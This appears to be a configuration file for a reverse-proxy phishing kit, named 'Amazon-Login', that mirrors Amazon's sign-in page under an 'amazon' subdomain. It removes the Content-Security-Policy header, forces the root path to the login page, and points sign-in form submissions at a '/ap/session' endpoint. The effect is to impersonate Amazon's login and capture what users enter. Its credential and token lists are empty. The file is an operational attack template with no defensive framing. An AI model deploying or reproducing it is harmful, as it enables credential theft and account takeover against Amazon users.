name: "Amazon-Login"
author: "Vanta v5"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "amazon"
    target: "www.amazon.com"
auth_urls: ["/ap/signin"]
landing_path: ["/ap/signin"]
auth_tokens: []
credentials: []
injections: []
headers:
  - {action: "remove", name: "Content-Security-Policy"}
path_rewrites:
  - {pattern: "^/$", replace: "/ap/signin", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "images|/ads|/tagging", mimes: ["image/"], max_kb: 300}
form_actions:
  - {selector: "form[action*=\"signin\"]", action_to: "/ap/session"}
